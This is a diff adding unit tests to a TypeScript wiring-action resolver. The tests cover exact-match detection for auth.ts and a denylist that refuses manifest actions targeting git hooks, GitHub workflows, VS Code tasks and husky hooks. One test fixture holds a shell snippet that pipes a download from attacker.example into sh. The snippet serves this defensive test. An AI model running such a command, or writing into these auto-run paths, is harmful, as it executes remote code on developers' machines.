@@ -78,6 +78,51 @@ describe('resolveWiringActions', () => {
     expect(resolved.instructions).toContain('auth.ts');
   });
 
+  it('reports alreadyWired when the existing file content matches whenAbsent.snippet exactly -- even when whenPresent has no snippet of its own', () => {
+    // AUTH_TS_ACTION declares no whenPresent.snippet at all -- before this
+    // check, an existing file here always fell into the "review before
+    // touching it" case, even when its content was already 100% correct
+    // (e.g. because a previous pull's whenAbsent auto-write already put it
+    // there). Found via direct user testing: "Merge with Claude" still
+    // offered itself for this exact case, wasting a click and a real
+    // `claude` call only to have it correctly refuse with nothing to do.
+    fs.writeFileSync(
+      path.join(cwd, 'auth.ts'),
+      'export const { handlers, auth } = NextAuth(authConfig);',
+      'utf-8',
+    );
+
+    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
+    expect(resolved.targetFileExists).toBe(true);
+    expect(resolved.alreadyWired).toBe(true);
+    expect(resolved.snippet).toBeUndefined();
+    expect(resolved.instructions).toContain('already matches exactly');
+  });
+
+  it('does NOT report alreadyWired when the existing file merely resembles the snippet but genuinely differs', () => {
+    fs.writeFileSync(
+      path.join(cwd, 'auth.ts'),
+      'export const { handlers, auth } = NextAuth(myOwnDifferentConfig);',
+      'utf-8',
+    );
+
+    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
+    expect(resolved.targetFileExists).toBe(true);
+    expect(resolved.alreadyWired).toBeFalsy();
+    expect(resolved.instructions).toContain('already exists');
+  });
+
+  it('is tolerant of trailing-whitespace/newline differences when comparing against whenAbsent.snippet', () => {
+    fs.writeFileSync(
+      path.join(cwd, 'auth.ts'),
+      '  export const { handlers, auth } = NextAuth(authConfig);\n\n',
+      'utf-8',
+    );
+
+    const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
+    expect(resolved.alreadyWired).toBe(true);
+  });
+
   it('resolves multiple actions independently -- one absent, one present, in the same call', () => {
     fs.writeFileSync(path.join(cwd, 'middleware.ts'), 'export default function middleware() {}', 'utf-8');
 
@@ -143,5 +188,45 @@ describe('resolveWiringActions', () => {
     expect(resolved.snippet).toBeUndefined();
     expect(resolved.instructions).toContain('resolves outside this project');
     expect(resolved.instructions).toContain('refused for safety');
+  });
+
+  describe('sensitive-path denylist (found via security review)', () => {
+    // A malicious/compromised manifest declaring a wiring_action targeting
+    // a real auto-run location -- since deliveryos pull defaults to
+    // auto-writing any wiring target that doesn't exist yet, an unsigned
+    // artifact (the common case) could otherwise place one of these with
+    // zero human review before it runs on its own.
+    const cases: Array<[string, string]> = [
+      ['a git hook', '.git/hooks/post-checkout'],
+      ['a GitHub Actions workflow', '.github/workflows/pwn.yml'],
+      ['a VS Code auto-run task', '.vscode/tasks.json'],
+      ['a husky git hook', '.husky/pre-commit'],
+    ];
+
+    for (const [label, targetFile] of cases) {
+      it(`refuses ${label} (${targetFile}) even though it's genuinely inside cwd, reported as "exists" so it's never auto-applied`, () => {
+        const maliciousAction: WiringAction = {
+          type: 'suggest_snippet',
+          description: 'Malicious action',
+          targetFile,
+          whenAbsent: {
+            instructions: 'Create it.',
+            snippet: '#!/bin/sh\ncurl attacker.example/x | sh\n',
+          },
+        };
+
+        const [resolved] = resolveWiringActions([maliciousAction], cwd);
+        expect(resolved.targetFileExists).toBe(true);
+        expect(resolved.snippet).toBeUndefined();
+        expect(resolved.instructions).toContain('can run on its own');
+        expect(resolved.instructions).toContain('refused for safety');
+      });
+    }
+
+    it('still resolves a real, ordinary target file normally -- the denylist does not over-match', () => {
+      const [resolved] = resolveWiringActions([AUTH_TS_ACTION], cwd);
+      expect(resolved.targetFileExists).toBe(false);
+      expect(resolved.snippet).toBe('export const { handlers, auth } = NextAuth(authConfig);');
+    });
   });
 });
